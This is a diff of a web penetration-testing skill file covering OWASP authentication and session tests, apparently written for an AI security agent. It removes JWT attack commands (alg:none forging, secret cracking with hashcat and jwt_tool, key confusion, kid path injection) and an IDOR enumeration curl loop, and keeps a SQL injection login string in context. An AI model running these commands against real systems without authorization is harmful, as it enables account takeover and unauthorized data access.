@@ -2,6 +2,8 @@
 name: wstg-auth-session
 description: Use when testing a web target's identity, authentication, authorization, and session management controls — WSTG-IDNT, WSTG-ATHN, WSTG-AUTHZ, WSTG-SESS.
 metadata:
+  acordia:
+    family: web-methodology
   cyberstrike:
     source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-auth-session/SKILL.md
     commit: 359655518
@@ -86,30 +88,7 @@ admin' OR '1'='1
 
 ### JWT Vulnerabilities
 
-```bash
-# Decode JWT (no verification)
-echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
-
-# Test alg:none
-# Header: {"alg":"none","typ":"JWT"}
-echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
-
-# Brute force weak secret
-hashcat -a 0 -m 16500 JWT_TOKEN wordlist.txt
-# Or with jwt_tool:
-jwt_tool JWT_TOKEN -C -d wordlist.txt
-
-# Key confusion: RS256 → HS256
-# Sign with public key as HMAC secret
-jwt_tool JWT_TOKEN -X k -pk public.pem
-
-# kid injection
-# Header: {"alg":"HS256","kid":"../../dev/null"}
-jwt_tool JWT_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
-
-# jwk header injection
-jwt_tool JWT_TOKEN -X i
-```
+Decoding, `alg:none`, weak-secret cracking, RS256→HS256 key confusion, `kid` and `jwk` header injection → see `attack-jwt`.
 
 ## Session Token Analysis
 
@@ -166,25 +145,7 @@ curl -X POST https://TARGET/change-email \
 
 ## IDOR Testing Patterns
 
-```bash
-# Numeric ID increment
-# /api/users/1 → /api/users/2 → /api/users/3
-for id in $(seq 1 20); do
-  curl -s -o /dev/null -w "%{http_code} id=$id\n" \
-    -H "Cookie: session=LOW_PRIV_SESSION" \
-    "https://TARGET/api/users/$id"
-done
-
-# UUID/GUID swap: capture another user's UUID from responses
-# Replace in: /api/profile/{uuid}, /api/orders/{uuid}
-
-# Parameter-based IDOR
-# Change user_id, account_id, order_id in POST body
-# Change role, group_id, org_id parameters
-
-# HTTP method switch
-# GET /api/users/2 (blocked) → POST /api/users/2 (allowed?)
-```
+Sequential-ID enumeration, UUID swap, parameter-based references and HTTP method switching → see `attack-idor-automation`.
 
 ## Privilege Escalation Patterns
 
